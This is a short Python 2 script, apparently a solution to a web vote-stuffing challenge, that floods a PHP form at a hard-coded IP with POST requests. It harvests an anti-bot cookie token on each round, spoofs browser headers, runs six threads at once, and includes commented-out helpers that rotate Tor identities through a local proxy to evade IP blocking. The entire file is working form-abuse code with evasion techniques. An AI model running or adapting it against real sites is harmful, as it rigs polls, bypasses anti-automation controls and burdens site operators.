#!/usr/bin/python

from TorCtl import TorCtl
import requests
import shutil
import urllib, urllib2
import threading
import random

url = "http://54.221.6.249/level2.php"

identity = 1024

headers = {\
        'Host': "54.221.6.249", \
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0", \
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", \
        'Accept-Language': "en-US,en;q=0.5", \
        'Referer': str(url), \
        'Connection': "keep-alive"}

data = {\
        'id': str(identity), \
        'holdthedoor': "Submit", \
        'key': "0"}


def set_urlproxy():
    proxy_support = urllib2.ProxyHandler({"http" : "127.0.0.1:8118"})
    opener = urllib2.build_opener(proxy_support)
    urllib2.install_opener(opener)

def renew_connection():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="password")
    conn.send_signal("NEWNYM")
    conn.close()

def spam():
    req = requests.get(url)
    for i in range(random.randint(59012, 62343), 65535):
        cookies = req.cookies
        data['key'] = cookies['HoldTheDoor']
        data['id'] = i
        req = requests.post(url, data=data, headers=headers, cookies=cookies)
        req = requests.get(url)
#set_urlproxy()
#renew_connection()
for i in range(6):
    threading.Thread(target=spam).start()
